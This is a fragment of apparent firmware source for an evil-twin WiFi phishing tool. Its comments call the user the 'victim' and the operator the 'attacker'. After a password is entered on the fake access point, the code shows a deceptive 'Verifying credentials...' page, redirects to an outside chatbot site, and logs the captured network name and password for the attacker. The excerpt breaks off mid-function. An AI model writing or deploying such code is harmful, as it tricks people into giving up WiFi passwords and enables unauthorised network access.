...
// Constants
const String CHATBOT_URL = "https://wifi-chatbot.vercel.app/";
...
String generateRedirectHTML() {
  return "<!DOCTYPE html><html><head>"
         "<meta http-equiv='refresh' content='0;url=" + CHATBOT_URL + "'>"
         "<script>"
         "setTimeout(function(){ window.location.href = '" + CHATBOT_URL + "'; }, 1000);"
         "</script>"
         "<meta name='viewport' content='width=device-width, initial-scale=1'>"
         "</head><body style='text-align:center; font-family:Arial;'>"
         "<h2>Verifying credentials...</h2>"
         "<p>Redirecting to security portal</p>"
         "</body></html>";
}

void handleResult() {
  // Redirect the user (victim) to the chatbot webpage after submitting the password
  webServer.send(200, "text/html", generateRedirectHTML());

  // Log the captured password to Serial for the attacker
  _correct = "Captured password for: " + _selectedNetwork.ssid + " => " + _tryPassword;
  Serial.println(_correct);

  // Stop the hotspot and reset the fake AP
